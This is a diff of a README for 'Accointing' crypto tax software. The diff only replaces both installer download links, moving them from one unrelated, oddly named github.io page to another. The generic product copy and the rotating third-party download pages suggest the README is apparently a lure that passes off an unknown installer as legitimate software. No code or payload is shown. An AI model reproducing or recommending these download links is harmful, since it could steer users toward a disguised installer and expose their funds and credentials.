@@ -2,7 +2,7 @@
 
 Accointing is the ultimate crypto tax software designed to help you manage your digital assets, track transactions, and generate compliant tax reports with minimal effort. Whether you're a casual investor or a professional trader, Accointing provides all the tools you need for seamless financial management and ensures you stay ahead in the ever-evolving world of cryptocurrency taxation.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -67,6 +67,6 @@ For a full list of changes, visit the [releases section](https://github.com/your
 
 Ready to simplify your crypto taxes? Download Accointing now and take control of your financial future.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This tool is provided as-is for educational and productivity purposes. Remember to always verify tax compliance with a professional advisor. Accointing helps you manage data efficiently, but it's not a substitute for expert advice.
